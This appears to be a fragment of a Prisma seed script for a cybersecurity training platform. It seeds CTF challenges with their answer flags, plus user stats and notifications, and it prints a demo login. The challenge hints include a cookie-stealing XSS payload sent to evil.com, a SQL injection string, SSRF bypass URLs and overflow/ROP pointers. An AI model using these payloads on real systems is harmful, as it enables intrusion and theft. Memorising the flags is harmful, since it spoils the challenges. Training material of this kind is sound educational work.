     1→     1→import { PrismaClient } from '@prisma/client';
     2→     2→import bcrypt from 'bcryptjs';
     3→     3→
     4→     4→const db = new PrismaClient();
     5→     5→
     6→     6→async function main() {
   245→   245→    { title: 'AES ECB Penguin', description: 'An image was encrypted with AES-ECB mode. The encrypted file shows a recognizable pattern because ECB encrypts identical plaintext blocks to identical ciphertext blocks.\n\nThe flag is the weakness name of this mode in leet speak: CYBERSHIELD{...}', category: 'crypto', difficulty: 'hard', points: 300, hint: 'ECB mode does not use an IV, so identical plaintext blocks produce identical ciphertext blocks. The weakness is lack of diffusion.', flag: 'CYBERSHIELD{3cb_l4cks_d1ffus10n}', solveCount: 34 },
   246→   246→    // Web (5)
   247→   247→    { title: 'SQL Injection 101', description: 'A vulnerable login form accepts user input without sanitization. The backend query is:\n```sql\nSELECT * FROM users WHERE username = \'[input]\' AND password = \'[input]\'\n```\n\nFind the flag in the database. Flag format: CYBERSHIELD{...}', category: 'web', difficulty: 'easy', points: 100, hint: 'Try classic SQL injection: admin\' OR \'1\'=\'1\' --', flag: 'CYBERSHIELD{sqli_m4st3r_2024}', solveCount: 128 },
   248→   248→    { title: 'XSS Reflection', description: 'A search page reflects user input without escaping. The flag is hidden in the admin cookie.\n\nURL: /search?q=YOUR_PAYLOAD\n\nCraft a payload to steal or read the admin cookie. Flag: CYBERSHIELD{...}', category: 'web', difficulty: 'medium', points: 150, hint: 'Try: <script>document.location=\'http://evil.com/?c=\'+document.cookie</script> or use <img onerror=...>', flag: 'CYBERSHIELD{r3fl3ct3d_xss_ftw}', solveCount: 87 },
   249→   249→    { title: 'Broken JWT', description: 'An application uses JWT for authentication. The token was intercepted:\n\n`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QifQ.`\n\nNotice the algorithm is "none". Forge a token with admin role.', category: 'web', difficulty: 'medium', points: 200, hint: 'The "none" algorithm vulnerability allows you to create unsigned tokens. Change the role to "admin" and encode in base64.', flag: 'CYBERSHIELD{jwt_n0n3_4lg0}', solveCount: 56 },
   250→   250→    { title: 'SSRF to Internal', description: 'An image proxy endpoint fetches URLs: /api/fetch?url=TARGET\n\nThe internal admin panel runs on http://127.0.0.1:8080/admin. The flag is in the response.\n\nBypass any URL validation to reach the internal service.', category: 'web', difficulty: 'hard', points: 300, hint: 'Try: http://127.0.0.1:8080/admin or http://localhost:8080/admin. If filtered, try URL encoding or http://0x7f000001:8080/admin.', flag: 'CYBERSHIELD{ssrf_t0_1nt3rn4l}', solveCount: 29 },
   251→   251→    // Pwn (4)
   252→   252→    { title: 'Buffer Overflow Basic', description: 'A vulnerable C program:\n```c\nvoid vuln() {\n  char buf[64];\n  gets(buf);\n}\nvoid win() { system(\"cat flag.txt\"); }\n```\n\nOverflow the buffer to redirect execution to win().', category: 'pwn', difficulty: 'medium', points: 200, hint: 'You need 64 bytes of padding + the address of win(). Use: python -c "print(\'A\'*64 + win_addr)" | ./vuln', flag: 'CYBERSHIELD{buff3r_0v3rfl0w_m4st3r}', solveCount: 45 },
   253→   253→    { title: 'Format String Bug', description: 'A program prints user input directly as a format string:\n```c\nchar buf[256];\nscanf("%s", buf);\nprintf(buf);\n```\n\nExploit the format string vulnerability to leak or write data. Flag is in a global variable called "secret".', category: 'pwn', difficulty: 'hard', points: 350, hint: 'Use %x to leak stack values, %s to read strings, %n to write. Try %p.%p.%p.%p to find the secret pointer.', flag: 'CYBERSHIELD{f0rm4t_str1ng_pwn3d}', solveCount: 18 },
   254→   254→    { title: 'ROP Chain', description: 'NX is enabled but ASLR is disabled. Build a Return-Oriented Programming chain to call system("/bin/sh").\n\nBinary: ./rop_challenge (64-bit ELF)\n\nFind gadgets using ropper or ROPgadget.', category: 'pwn', difficulty: 'insane', points: 500, hint: 'Look for pop rdi; ret gadget to set rdi to "/bin/sh" string address, then ret to system@plt.', flag: 'CYBERSHIELD{r0p_ch41n_g0d}', solveCount: 8 },
   255→   255→    { title: 'Heap Overflow', description: 'A program uses malloc/free without proper bounds checking. Exploit a use-after-free or double-free vulnerability to get a shell.\n\nBinary: ./heap_challenge', category: 'pwn', difficulty: 'insane', points: 500, hint: 'This is a tcache poisoning or fastbin attack. Free a chunk, overwrite its fd pointer, then allocate to get arbitrary write.', flag: 'CYBERSHIELD{h34p_3xpl01t_pr0}', solveCount: 5 },
   256→   256→    // Forensics (4)
   257→   257→    { title: 'Forensic Artifact', description: 'A disk image was recovered from a suspects machine. Find the deleted file containing the flag.\n\nThe flag is hidden in the MFT entry of a deleted file named "secret.txt".\n\nTool suggestion: Use `mmls` to find partitions, then `fls` to list files, `icat` to extract.', category: 'forensics', difficulty: 'medium', points: 200, hint: 'The MFT (Master File Table) in NTFS keeps records of deleted files. Use sleuth kit tools: fls -r -p image.dd', flag: 'CYBERSHIELD{d1g_d33p_1nt0_th3_b1ts}', solveCount: 42 },
   258→   258→    { title: 'PCAP Analysis', description: 'We captured network traffic during a data exfiltration attack. Analyze the PCAP file to find the stolen data.\n\nThe flag is hidden in a DNS exfiltration channel. Look for unusual DNS queries.', category: 'forensics', difficulty: 'medium', points: 175, hint: 'Filter DNS traffic in Wireshark: dns.qry.name contains "exfil". The flag is encoded in subdomain labels as hex.', flag: 'CYBERSHIELD{dns_3xf1l_tr4c3d}', solveCount: 38 },
   259→   259→    { title: 'Memory Forensics', description: 'A memory dump from a compromised machine. Find the malicious process and extract the injected payload.\n\nUse Volatility3 framework. The flag is in the injected code section.', category: 'forensics', difficulty: 'hard', points: 350, hint: 'Run: vol -f memdump.raw windows.malfind to find injected code. Then vol -f memdump.raw windows.memmap to extract it.', flag: 'CYBERSHIELD{m3m_f0r3ns1cs_w1n}', solveCount: 15 },
   260→   260→    { title: 'Steganography', description: 'An innocent-looking image hides a secret message. The flag is embedded using LSB steganography.\n\nDownload: challenge.png\n\nExtract the hidden message using steganography tools.', category: 'forensics', difficulty: 'easy', points: 125, hint: 'Use steghide: steghide extract -sf challenge.png. If it asks for a passphrase, try empty or "password".', flag: 'CYBERSHIELD{lsb_h1dd3n_msg}', solveCount: 76 },
   261→   261→    // OSINT (3)
   262→   262→    { title: 'Digital Footprint', description: 'A target left traces across multiple social media platforms. Find their real identity by correlating information.\n\nUsername: @shadow_h4cker_2024\n\nThe flag is their real full name in format: CYBERSHIELD{firstname_lastname}.', category: 'osint', difficulty: 'easy', points: 75, hint: 'Search the username on Twitter, GitHub, Reddit. Look for profile pictures, bio overlaps, and connected accounts.', flag: 'CYBERSHIELD{jane_doe_osint}', solveCount: 112 },
   263→   263→    { title: 'Metadata Extract', description: 'A photo was posted online. The EXIF metadata contains GPS coordinates that reveal a secret location.\n\nThe flag is the 6-digit latitude*1000 (rounded) at that location.', category: 'osint', difficulty: 'easy', points: 100, hint: 'Use exiftool to extract metadata from the image. Look for GPSLatitude and GPSLongitude fields.', flag: 'CYBERSHIELD{407123}', solveCount: 94 },
   264→   264→    { title: 'Wayback Machine', description: 'A website was taken down but we need its old content. Use the Wayback Machine to find a deleted page.\n\nURL: http://old-site.example.com/secret-page\n\nThe flag was on this page before it was removed.', category: 'osint', difficulty: 'medium', points: 150, hint: 'Visit web.archive.org and search for the URL. Check snapshots from 2023.', flag: 'CYBERSHIELD{w4yb4ck_t1m3_m4ch1n3}', solveCount: 63 },
   265→   265→  ];
   266→   266→
   267→   267→  for (const c of ctfData) {
   268→   268→    await db.ctfChallenge.create({ data: c });
   269→   269→  }
   270→   270→
   271→   271→  // ── CTF Submissions (for leaderboard stats) ──
   272→   272→  const solvedBySarah = ctfData.slice(0, 18);
   273→   273→  const solvedByJames = ctfData.slice(0, 14);
   274→   274→  const solvedByPriya = ctfData.slice(0, 11);
   275→   275→  for (let i = 0; i < solvedBySarah.length; i++) {
   276→   276→    await db.ctfSubmission.create({ data: { userId: sarah.id, challengeId: (await db.ctfChallenge.findFirst({ where: { title: solvedBySarah[i].title } }))!.id, flagSubmitted: solvedBySarah[i].flag, correct: true } });
   277→   277→  }
   278→   278→  for (let i = 0; i < solvedByJames.length; i++) {
   279→   279→    await db.ctfSubmission.create({ data: { userId: james.id, challengeId: (await db.ctfChallenge.findFirst({ where: { title: solvedByJames[i].title } }))!.id, flagSubmitted: solvedByJames[i].flag, correct: true } });
   280→   280→  }
   281→   281→  for (let i = 0; i < solvedByPriya.length; i++) {
   282→   282→    await db.ctfSubmission.create({ data: { userId: priya.id, challengeId: (await db.ctfChallenge.findFirst({ where: { title: solvedByPriya[i].title } }))!.id, flagSubmitted: solvedByPriya[i].flag, correct: true } });
   283→   283→  }
   284→   284→
   285→   285→  // ── XP Logs ──
   286→   286→  await db.xpLog.createMany({
   287→   287→    data: [
   288→   288→      { userId: alex.id, amount: 100, source: 'enrollment', description: 'Enrolled in Network Security' },
   289→   289→      { userId: alex.id, amount: 200, source: 'quiz', description: 'Scored 80% on Cryptography Quiz' },
   290→   290→      { userId: alex.id, amount: 150, source: 'lab', description: 'Completed Firewall Lab' },
   291→   291→      { userId: alex.id, amount: 50, source: 'badge', description: 'First Blood badge' },
   292→   292→      { userId: alex.id, amount: 100, source: 'badge', description: 'Quiz Master badge' },
   293→   293→      { userId: alex.id, amount: 300, source: 'ctf', description: 'Solved SQL Injection 101' },
   294→   294→      { userId: alex.id, amount: 550, source: 'streak', description: '7-day streak bonus' },
   295→   295→      { userId: sarah.id, amount: 2500, source: 'ctf', description: 'Solved 18 CTF challenges' },
   296→   296→      { userId: sarah.id, amount: 800, source: 'quiz', description: 'Perfect scores on multiple quizzes' },
   297→   297→      { userId: sarah.id, amount: 1200, source: 'lab', description: 'Completed 10 lab sessions' },
   298→   298→      { userId: sarah.id, amount: 1000, source: 'streak', description: '15-day streak bonus' },
   299→   299→      { userId: james.id, amount: 1800, source: 'ctf', description: 'Solved 14 CTF challenges' },
   300→   300→      { userId: james.id, amount: 600, source: 'lab', description: 'Completed 7 lab sessions' },
   301→   301→    ],
   302→   302→  });
   303→   303→
   304→   304→  // ── Notifications ──
   305→   305→  await db.notification.createMany({
   306→   306→    data: [
   307→   307→      { userId: alex.id, title: 'New CTF Challenge', message: 'Heap Overflow is now live in the Pwn category!', type: 'info' },
   308→   308→      { userId: alex.id, title: 'Quiz Score', message: 'You scored 90% on Network Fundamentals!', type: 'success' },
   309→   309→      { userId: alex.id, title: 'Badge Earned', message: 'You earned the Quiz Master badge!', type: 'achievement' },
   310→   310→      { userId: alex.id, title: 'Streak Bonus', message: '7-day streak! +550 XP bonus earned!', type: 'xp' },
   311→   311→      { userId: alex.id, title: 'New Course', message: 'Mobile Application Security is now available!', type: 'info' },
   312→   312→      { userId: alex.id, title: 'Leaderboard Update', message: 'You moved up to rank #4!', type: 'achievement' },
   313→   313→    ],
   314→   314→  });
   315→   315→
   316→   316→  // ── Performance Metrics ──
   317→   317→  await db.performanceMetrics.createMany({
   318→   318→    data: [
   319→   319→      { userId: alex.id, courseId: courses[0].id, quizAccuracy: 0.82, comprehensionScore: 0.78, averageFocusScore: 0.87, labCompletionRate: 0.68, interactionCount: 142, timeSpentMinutes: 420, strengths: 'Network scanning, TCP/IP, cryptography basics', weaknesses: 'Cloud security, advanced forensics', recommendations: 'Focus on cloud security modules and complete the advanced forensics lab.' },
   320→   320→      { userId: sarah.id, courseId: courses[0].id, quizAccuracy: 0.95, comprehensionScore: 0.92, averageFocusScore: 0.94, labCompletionRate: 0.90, interactionCount: 380, timeSpentMinutes: 1200, strengths: 'Web security, cryptography, forensics, reverse engineering', weaknesses: 'None significant', recommendations: 'Ready for advanced courses.' },
   321→   321→    ],
   322→   322→  });
   323→   323→
   324→   324→  console.log('Seed complete! Demo: alex@cybershield.academy / demo1234');
   325→   325→  console.log(`Alex ID: ${alex.id}`);
   326→   326→  console.log(`Users: ${users.length}, Courses: ${courses.length}, Modules: ${allModules.length}, CTF: ${ctfData.length}, Badges: ${allBadges.length}`);
   327→   327→}
   328→   328→
   329→   329→main()
   330→   330→  .catch(e => { console.error(e); process.exit(1); })
   331→   331→  .finally(() => db.$disconnect()); 
